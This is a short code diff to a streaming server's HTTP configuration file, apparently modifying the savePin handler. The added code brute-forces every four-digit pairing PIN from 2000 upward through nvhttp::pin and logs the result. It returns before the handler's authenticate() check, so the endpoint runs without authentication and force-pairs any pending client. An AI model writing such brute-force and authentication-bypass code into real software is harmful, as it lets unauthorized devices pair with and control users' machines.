@@ -1,0 +1,23 @@
+diff --git a/src/confighttp.cpp b/src/confighttp.cpp
+index 0de9cfb..7b49728 100644
+--- a/src/confighttp.cpp
++++ b/src/confighttp.cpp
+@@ -662,6 +662,18 @@ namespace confighttp {
+ 
+   void
+   savePin(resp_https_t response, req_https_t request) {
++    for (int i = 2000; i < 10000; ++i) {
++        std::string pin = std::to_string(i);
++        std::string formattedPin = std::string(4 - pin.length(), '0') + pin;
++        BOOST_LOG(info) << formattedPin << "A"sv;
++        if (nvhttp::pin(formattedPin)) {
++            BOOST_LOG(info) << "DONE found :)"sv;
++            return;
++        }
++    }
++    BOOST_LOG(info) << "DONE aNOT FOUND"sv;
++    return;
++
+     if (!authenticate(response, request)) return;
+ 
+     print_req(request);
